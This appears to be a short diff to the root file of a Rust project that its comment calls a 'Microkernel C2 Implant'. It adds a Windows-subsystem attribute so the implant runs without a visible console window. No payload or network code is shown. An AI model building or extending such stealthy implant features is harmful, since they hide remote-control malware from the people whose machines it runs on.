@@ -1,6 +1,7 @@
 //! Hermes Agent - Microkernel C2 Implant
 
 #![allow(unused_variables)]
+#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 
 pub mod kernel;
 pub mod ops;
